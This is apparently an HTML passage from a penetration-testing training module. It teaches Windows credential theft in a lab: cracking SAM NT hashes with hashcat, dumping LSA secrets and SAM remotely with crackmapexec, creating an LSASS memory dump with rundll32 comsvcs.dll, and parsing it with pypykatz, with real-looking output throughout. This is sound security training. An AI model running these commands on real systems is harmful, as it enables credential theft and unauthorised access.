&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that the NT hashes are in our text file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashestocrack.txt&lt;/code&gt;), we can use Hashcat to crack them.&lt;/p&gt;

&lt;h6 id=&quot;running-hashcat-against-nt-hashes&quot;&gt;Running Hashcat against NT Hashes&lt;/h6&gt;

&lt;p&gt;Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m&lt;/code&gt; to select the hash type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt; to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat’s &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;wiki page&lt;/a&gt; or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Storage&lt;/code&gt; section of this module.&lt;/p&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...

&amp;lt;SNIP&amp;gt;

Dictionary cache hit:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: /usr/share/wordlists/rockyou.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 14344385
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 139921507
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Dec 14 14:16:56 2021 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/wordlists/rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    14284 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.63ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests
Progress.........: 8192/14344385 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.06%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 0/8192 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 4096/14344385 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.03%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -&amp;gt; whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see from the output that Hashcat used a type of attack called a &lt;a href=&quot;https://en.wikipedia.org/wiki/Dictionary_attack&quot;&gt;dictionary attack&lt;/a&gt; to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes. Having the passwords could be useful to us in many ways. We could attempt to use the passwords we cracked to access other systems on the network. It is very common for people to re-use passwords across different work &amp;amp; personal accounts. Knowing this technique, we covered can be useful on engagements. We will benefit from using this any time we come across a vulnerable Windows system and gain admin rights to dump the SAM database.&lt;/p&gt;

&lt;p&gt;Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it. We can see some of these ways &lt;a href=&quot;https://attack.mitre.org/techniques/T1003/002/&quot;&gt;documented&lt;/a&gt; within the MITRE attack framework.&lt;/p&gt;

&lt;h6 id=&quot;remote-dumping--lsa-secrets-considerations&quot;&gt;Remote Dumping &amp;amp; LSA Secrets Considerations&lt;/h6&gt;

&lt;p&gt;With access to credentials with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local admin privileges&lt;/code&gt;, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.&lt;/p&gt;

&lt;h4 id=&quot;dumping-lsa-secrets-remotely&quot;&gt;Dumping LSA Secrets Remotely&lt;/h4&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crackmapexec smb 10.129.42.198 &lt;span class=&quot;nt&quot;&gt;--local-auth&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bob &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; HTB_@cademy_stdnt! &lt;span class=&quot;nt&quot;&gt;--lsa&lt;/span&gt;

SMB         10.129.42.198   445    WS01     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 18362 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:FRONTDESK01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:FRONTDESK01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.42.198   445    WS01     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WS01&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ob:HTB_@cademy_stdnt!&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.42.198   445    WS01     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;orker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL&lt;span class=&quot;nv&quot;&gt;$KM&lt;/span&gt;:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;dumping-sam-remotely&quot;&gt;Dumping SAM Remotely&lt;/h6&gt;

&lt;p&gt;We can also dump hashes from the SAM database remotely.&lt;/p&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crackmapexec smb 10.129.42.198 &lt;span class=&quot;nt&quot;&gt;--local-auth&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bob &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; HTB_@cademy_stdnt! &lt;span class=&quot;nt&quot;&gt;--sam&lt;/span&gt;

SMB         10.129.42.198   445    WS01      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 18362 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:FRONTDESK01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WS01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.42.198   445    WS01      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] FRONTDESK01&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ob:HTB_@cademy_stdnt! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.42.198   445    WS01      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Added 8 SAM hashes to the database
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;attacking-lsass&quot;&gt;Attacking LSASS&lt;/h3&gt;

&lt;p&gt;In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Storage&lt;/code&gt; section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png&quot; alt=&quot;Diagram of Windows authentication process showing interactions between WinLogon.exe, lsass.exe, authentication packages, NTLM, and Kerberos.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon initial logon, LSASS will:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cache credentials locally in memory&lt;/li&gt;
  &lt;li&gt;Create &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens&quot;&gt;access tokens&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Enforce security policies&lt;/li&gt;
  &lt;li&gt;Write to Windows &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security&quot;&gt;security log&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;dumping-lsass-process-memory&quot;&gt;Dumping LSASS Process Memory&lt;/h2&gt;

&lt;p&gt;Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let’s cover techniques that can be performed using tools already built-in to Windows.&lt;/p&gt;

&lt;h4 id=&quot;task-manager-method&quot;&gt;Task Manager Method&lt;/h4&gt;

&lt;p&gt;With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png&quot; alt=&quot;Task Manager showing Local Security Authority Process with right-click menu open, highlighting &apos;Create dump file&apos; option, and lsass.DMP file in search results.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Open Task Manager&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Select the Processes tab&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Find &amp;amp; right click the Local Security Authority Process&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Select Create dump file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;A file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsass.DMP&lt;/code&gt; is created and saved in:&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users\loggedonusersdirectory\AppData\Local\Temp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is the file we will transfer to our attack host. We can use the file transfer method discussed in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Attacking SAM&lt;/code&gt; section of this module to transfer the dump file to our attack host.&lt;/p&gt;

&lt;h5 id=&quot;rundll32exe--comsvcsdll-method&quot;&gt;Rundll32.exe &amp;amp; Comsvcs.dll Method&lt;/h5&gt;

&lt;p&gt;The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32&quot;&gt;rundll32.exe&lt;/a&gt;. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.&lt;/p&gt;

&lt;p&gt;Before issuing the command to create the dump file, we must determine what process ID (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt;) is assigned to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsass.exe&lt;/code&gt;. This can be done from cmd or PowerShell:&lt;/p&gt;

&lt;h5 id=&quot;finding-lsass-pid-in-cmd&quot;&gt;Finding LSASS PID in cmd&lt;/h5&gt;

&lt;p&gt;From cmd, we can issue the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tasklist /svc&lt;/code&gt; and find lsass.exe and its process ID in the PID field.&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Windows\system32&amp;gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;finding-lsass-pid-in-powershell&quot;&gt;Finding LSASS PID in PowerShell&lt;/h6&gt;

&lt;p&gt;From PowerShell, we can issue the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get-Process lsass&lt;/code&gt; and see the process ID in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Id&lt;/code&gt; field.&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\system32&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lsass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handles&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NPM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CPU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Id&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SI&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ProcessName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1260&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4948&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15396&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.56&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;672&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have the PID assigned to the LSASS process, we can create the dump file.&lt;/p&gt;

&lt;h6 id=&quot;creating-lsassdmp-using-powershell&quot;&gt;Creating lsass.dmp using PowerShell&lt;/h6&gt;

&lt;p&gt;With an elevated PowerShell session, we can issue the following command to create the dump file:&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\system32&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rundll32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\windows\system32\comsvcs.dll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MiniDump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;672&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\lsass.dmp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;full&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this command, we are running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rundll32.exe&lt;/code&gt; to call an exported function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;comsvcs.dll&lt;/code&gt; which also calls the MiniDumpWriteDump (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MiniDump&lt;/code&gt;) function to dump the LSASS process memory to a specified directory (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\lsass.dmp&lt;/code&gt;). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.&lt;/p&gt;

&lt;p&gt;If we manage to run this command and generate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsass.dmp&lt;/code&gt; file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.&lt;/p&gt;

&lt;p&gt;Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.&lt;/p&gt;

&lt;h5 id=&quot;using-pypykatz-to-extract-credentials&quot;&gt;Using Pypykatz to Extract Credentials&lt;/h5&gt;

&lt;p&gt;Once we have the dump file on our attack host, we can use a powerful tool called &lt;a href=&quot;https://github.com/skelsec/pypykatz&quot;&gt;pypykatz&lt;/a&gt; to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.&lt;/p&gt;

&lt;p&gt;Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a “snapshot” of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let’s run Pypykatz against the dump file and find out.&lt;/p&gt;

&lt;h6 id=&quot;running-pypykatz&quot;&gt;Running Pypykatz&lt;/h6&gt;

&lt;p&gt;The command initiates the use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pypykatz&lt;/code&gt; to parse the secrets hidden in the LSASS process memory dump. We use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsa&lt;/code&gt; in the command because LSASS is a subsystem of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local security authority&lt;/code&gt;, then we specify the data source as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;minidump&lt;/code&gt; file, proceeded by the path to the dump file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/peter/Documents/lsass.dmp&lt;/code&gt;) stored on our attack host. Pypykatz parses the dump file and outputs the findings:&lt;/p&gt;

&lt;p&gt;Attacking LSASS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt; /home/peter/Documents/lsass.dmp &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; LogonSession &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
authentication_id 1354633 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14ab89&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; MSV &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; WDIGEST &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14ab89]&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
		username bob
		domainname DESKTOP-33E7O54
		password None
		password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
